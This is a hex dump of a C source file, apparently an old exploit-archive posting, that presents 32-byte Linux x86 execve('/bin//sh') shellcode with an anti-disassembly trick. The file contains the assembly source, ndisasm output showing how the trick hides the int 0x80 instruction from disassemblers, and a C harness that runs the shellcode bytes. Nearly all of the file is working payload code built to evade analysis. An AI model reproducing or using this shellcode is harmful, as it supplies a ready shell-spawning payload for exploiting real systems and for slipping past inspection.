00000000  2f 2a 20 20 65 78 65 63  76 65 28 29 20 73 68 65  |/*  execve() she|
00000010  6c 6c 63 6f 64 65 20 77  69 74 68 20 27 66 75 63  |llcode with 'fuc|
00000020  6b 20 75 70 20 64 69 73  61 73 6d 27 20 61 62 69  |k up disasm' abi|
00000030  6c 69 74 79 2c 20 33 32  20 62 79 74 65 73 20 6c  |lity, 32 bytes l|
00000040  6f 6e 67 0d 0a 20 20 20  20 62 79 20 42 61 43 6b  |ong..    by BaCk|
00000050  53 70 41 63 45 20 5b 73  69 6e 69 73 61 38 36 28  |SpAcE [sinisa86(|
00000060  61 74 29 67 6d 61 69 6c  28 64 6f 74 29 63 6f 6d  |at)gmail(dot)com|
00000070  5d 0d 0a 20 20 20 20 42  69 74 42 79 74 65 72 7a  |]..    BitByterz|
00000080  20 4c 61 62 73 20 32 30  30 36 0d 0a 20 20 20 20  | Labs 2006..    |
00000090  68 74 74 70 3a 2f 2f 77  77 77 2e 62 69 74 62 79  |http://www.bitby|
000000a0  74 65 72 7a 2e 6f 72 67  0d 0a 0d 0a 3b 0d 0a 3b  |terz.org....;..;|
000000b0  20 73 68 65 6c 6c 63 6f  64 65 2e 61 73 6d 0d 0a  | shellcode.asm..|
000000c0  3b 0d 0a 20 20 66 75 70  64 69 73 61 73 6d 3a 0d  |;..  fupdisasm:.|
000000d0  0a 20 20 20 20 64 62 20  30 78 36 38 09 09 3b 20  |.    db 0x68..; |
000000e0  6f 70 63 6f 64 65 20 66  6f 72 20 50 55 53 48 20  |opcode for PUSH |
000000f0  44 57 20 69 6e 73 74 72  75 63 74 69 6f 6e 0d 0a  |DW instruction..|
00000100  20 20 20 20 64 62 20 30  78 63 64 09 09 3b 20 63  |    db 0xcd..; c|
00000110  72 79 70 74 2b 31 2c 20  6f 70 63 6f 64 65 20 66  |rypt+1, opcode f|
00000120  6f 72 20 49 4e 54 20 69  6e 73 74 72 75 63 74 69  |or INT instructi|
00000130  6f 6e 0d 0a 20 20 20 20  64 62 20 30 78 38 30 09  |on..    db 0x80.|
00000140  09 3b 20 69 6e 74 65 72  72 75 70 74 20 6e 75 6d  |.; interrupt num|
00000150  62 65 72 20 28 38 30 20  69 6e 20 74 68 69 73 20  |ber (80 in this |
00000160  63 61 73 65 29 0d 0a 20  20 20 20 64 62 20 30 78  |case)..    db 0x|
00000170  36 38 09 09 3b 20 63 72  79 70 74 2b 33 0d 0a 20  |68..; crypt+3.. |
00000180  20 20 20 64 62 20 30 78  36 38 0d 0a 20 20 20 20  |   db 0x68..    |
00000190  6a 6d 70 20 66 75 70 64  69 73 61 73 6d 2b 33 0d  |jmp fupdisasm+3.|
000001a0  0a 20 20 20 20 64 62 20  30 78 36 38 09 09 3b 20  |.    db 0x68..; |
000001b0  4d 41 47 49 43 5f 42 59  54 45 3a 20 74 68 69 73  |MAGIC_BYTE: this|
000001c0  20 62 79 74 65 20 6d 61  6b 65 73 20 64 69 73 61  | byte makes disa|
000001d0  73 6d 20 67 6f 20 63 72  61 7a 79 0d 0a 0d 0a 3b  |sm go crazy....;|
000001e0  20 6f 75 72 20 73 68 65  6c 6c 63 6f 64 65 20 77  | our shellcode w|
000001f0  68 69 63 68 20 77 65 20  77 61 6e 74 20 74 6f 20  |hich we want to |
00000200  68 69 64 65 0d 0a 20 20  20 20 70 75 73 68 20 62  |hide..    push b|
00000210  79 74 65 20 31 31 0d 0a  20 20 20 20 70 6f 70 20  |yte 11..    pop |
00000220  65 61 78 0d 0a 20 20 20  20 78 6f 72 20 65 64 78  |eax..    xor edx|
00000230  2c 20 65 64 78 0d 0a 20  20 20 20 70 75 73 68 20  |, edx..    push |
00000240  65 64 78 0d 0a 20 20 20  20 70 75 73 68 20 30 78  |edx..    push 0x|
00000250  36 38 37 33 32 66 32 66  0d 0a 20 20 20 20 70 75  |68732f2f..    pu|
00000260  73 68 20 30 78 36 65 36  39 36 32 32 66 0d 0a 20  |sh 0x6e69622f.. |
00000270  20 20 20 6d 6f 76 20 65  62 78 2c 20 65 73 70 0d  |   mov ebx, esp.|
00000280  0a 20 20 20 20 70 75 73  68 20 65 64 78 0d 0a 20  |.    push edx.. |
00000290  20 20 20 70 75 73 68 20  65 62 78 0d 0a 20 20 20  |   push ebx..   |
000002a0  20 6d 6f 76 20 65 63 78  2c 20 65 73 70 0d 0a 20  | mov ecx, esp.. |
000002b0  20 20 20 6a 6d 70 20 66  75 70 64 69 73 61 73 6d  |   jmp fupdisasm|
000002c0  2b 31 09 3b 20 6a 75 6d  70 73 20 6f 6e 20 61 64  |+1.; jumps on ad|
000002d0  64 72 65 73 73 20 77 68  65 72 65 20 69 73 20 68  |dress where is h|
000002e0  69 64 64 65 6e 20 69 6e  74 20 30 78 38 30 0d 0a  |idden int 0x80..|
000002f0  0d 0a 0d 0a 20 20 20 20  62 61 63 6b 73 70 61 63  |....    backspac|
00000300  65 40 62 69 74 62 79 74  65 72 7a 23 20 6e 61 73  |e@bitbyterz# nas|
00000310  6d 20 73 68 65 6c 6c 63  6f 64 65 2e 61 73 6d 0d  |m shellcode.asm.|
00000320  0a 20 20 20 20 62 61 63  6b 73 70 61 63 65 40 62  |.    backspace@b|
00000330  69 74 62 79 74 65 72 7a  23 20 6e 64 69 73 61 73  |itbyterz# ndisas|
00000340  6d 20 2d 75 20 73 68 65  6c 6c 63 6f 64 65 0d 0a  |m -u shellcode..|
00000350  20 20 20 20 30 30 30 30  30 30 30 30 20 20 36 38  |    00000000  68|
00000360  43 44 38 30 36 38 36 38  20 20 20 20 20 20 20 20  |CD806868        |
00000370  70 75 73 68 20 64 77 6f  72 64 20 30 78 36 38 36  |push dword 0x686|
00000380  38 38 30 63 64 0d 0a 20  20 20 20 30 30 30 30 30  |880cd..    00000|
00000390  30 30 35 20 20 45 42 46  43 20 20 20 20 20 20 20  |005  EBFC       |
000003a0  20 20 20 20 20 20 20 6a  6d 70 20 73 68 6f 72 74  |       jmp short|
000003b0  20 30 78 33 0d 0a 20 20  20 20 30 30 30 30 30 30  | 0x3..    000000|
000003c0  30 37 20 20 36 38 36 41  30 42 35 38 33 31 20 20  |07  686A0B5831  |
000003d0  20 20 20 20 20 20 70 75  73 68 20 64 77 6f 72 64  |      push dword|
000003e0  20 30 78 33 31 35 38 30  62 36 61 0d 0a 20 20 20  | 0x31580b6a..   |
000003f0  20 30 30 30 30 30 30 30  43 20 20 44 32 35 32 36  | 0000000C  D2526|
00000400  38 20 20 20 20 20 20 20  20 20 20 20 20 72 63 6c  |8            rcl|
00000410  20 62 79 74 65 20 5b 65  64 78 2b 30 78 36 38 5d  | byte [edx+0x68]|
00000420  2c 63 6c 0d 0a 20 20 20  20 30 30 30 30 30 30 30  |,cl..    0000000|
00000430  46 20 20 32 46 20 20 20  20 20 20 20 20 20 20 20  |F  2F           |
00000440  20 20 20 20 20 64 61 73  0d 0a 20 20 20 20 30 30  |     das..    00|
00000450  30 30 30 30 31 30 20 20  32 46 20 20 20 20 20 20  |000010  2F      |
00000460  20 20 20 20 20 20 20 20  20 20 64 61 73 0d 0a 20  |          das.. |
00000470  20 20 20 30 30 30 30 30  30 31 31 20 20 37 33 36  |   00000011  736|
00000480  38 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6a  |8              j|
00000490  6e 63 20 30 78 37 62 0d  0a 20 20 20 20 30 30 30  |nc 0x7b..    000|
000004a0  30 30 30 31 33 20 20 36  38 32 46 36 32 36 39 36  |00013  682F62696|
000004b0  45 20 20 20 20 20 20 20  20 70 75 73 68 20 64 77  |E        push dw|
000004c0  6f 72 64 20 30 78 36 65  36 39 36 32 32 66 0d 0a  |ord 0x6e69622f..|
000004d0  20 20 20 20 30 30 30 30  30 30 31 38 20 20 38 39  |    00000018  89|
000004e0  45 33 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |E3              |
000004f0  6d 6f 76 20 65 62 78 2c  65 73 70 0d 0a 20 20 20  |mov ebx,esp..   |
00000500  20 30 30 30 30 30 30 31  41 20 20 35 32 20 20 20  | 0000001A  52   |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000520  68 20 65 64 78 0d 0a 20  20 20 20 30 30 30 30 30  |h edx..    00000|
00000530  30 31 42 20 20 35 33 20  20 20 20 20 20 20 20 20  |01B  53         |
00000540  20 20 20 20 20 20 20 70  75 73 68 20 65 62 78 0d  |       push ebx.|
00000550  0a 20 20 20 20 30 30 30  30 30 30 31 43 20 20 38  |.    0000001C  8|
00000560  39 45 31 20 20 20 20 20  20 20 20 20 20 20 20 20  |9E1             |
00000570  20 6d 6f 76 20 65 63 78  2c 65 73 70 0d 0a 20 20  | mov ecx,esp..  |
00000580  20 20 30 30 30 30 30 30  31 45 20 20 45 42 45 31  |  0000001E  EBE1|
00000590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6a 6d  |              jm|
000005a0  70 20 73 68 6f 72 74 20  30 78 31 0d 0a 0d 0a 20  |p short 0x1.... |
000005b0  20 20 20 46 69 6e 64 20  64 69 66 66 65 72 65 6e  |   Find differen|
000005c0  63 65 20 62 65 74 77 65  65 6e 20 6f 72 69 67 69  |ce between origi|
000005d0  6e 61 6c 20 61 6e 64 20  64 69 73 73 61 73 65 6d  |nal and dissasem|
000005e0  62 6c 65 64 20 73 68 65  6c 6c 63 6f 64 65 20 3b  |bled shellcode ;|
000005f0  29 0d 0a 2a 2f 0d 0a 0d  0a 23 69 6e 63 6c 75 64  |)..*/....#includ|
00000600  65 20 3c 73 74 64 69 6f  2e 68 3e 0d 0a 23 69 6e  |e <stdio.h>..#in|
00000610  63 6c 75 64 65 20 3c 73  74 72 69 6e 67 2e 68 3e  |clude <string.h>|
00000620  0d 0a 0d 0a 63 68 61 72  20 73 68 65 6c 6c 63 6f  |....char shellco|
00000630  64 65 5b 5d 20 3d 20 20  20 20 20 20 22 5c 78 36  |de[] =      "\x6|
00000640  38 5c 78 63 64 5c 78 38  30 5c 78 36 38 5c 78 36  |8\xcd\x80\x68\x6|
00000650  38 5c 78 65 62 5c 78 66  63 5c 78 36 38 22 0d 0a  |8\xeb\xfc\x68"..|
00000660  09 09 09 22 5c 78 36 61  5c 78 30 62 5c 78 35 38  |..."\x6a\x0b\x58|
00000670  5c 78 33 31 5c 78 64 32  5c 78 35 32 5c 78 36 38  |\x31\xd2\x52\x68|
00000680  5c 78 32 66 22 0d 0a 09  09 09 22 5c 78 32 66 5c  |\x2f"....."\x2f\|
00000690  78 37 33 5c 78 36 38 5c  78 36 38 5c 78 32 66 5c  |x73\x68\x68\x2f\|
000006a0  78 36 32 5c 78 36 39 5c  78 36 65 22 0d 0a 09 09  |x62\x69\x6e"....|
000006b0  09 22 5c 78 38 39 5c 78  65 33 5c 78 35 32 5c 78  |."\x89\xe3\x52\x|
000006c0  35 33 5c 78 38 39 5c 78  65 31 5c 78 65 62 5c 78  |53\x89\xe1\xeb\x|
000006d0  65 31 22 3b 0d 0a 0d 0a  6d 61 69 6e 28 29 20 7b  |e1";....main() {|
000006e0  0d 0a 20 20 76 6f 69 64  20 20 28 2a 66 70 29 20  |..  void  (*fp) |
000006f0  28 76 6f 69 64 29 3b 0d  0a 20 20 66 70 20 3d 20  |(void);..  fp = |
00000700  28 76 6f 69 64 20 2a 29  20 73 68 65 6c 6c 63 6f  |(void *) shellco|
00000710  64 65 3b 0d 0a 20 20 70  72 69 6e 74 66 20 28 22  |de;..  printf ("|
00000720  25 64 20 62 79 74 65 73  5c 6e 22 2c 20 73 74 72  |%d bytes\n", str|
00000730  6c 65 6e 28 73 68 65 6c  6c 63 6f 64 65 29 29 3b  |len(shellcode));|
00000740  0d 0a 20 20 66 70 28 29  3b 0d 0a 7d              |..  fp();..}|
0000074c
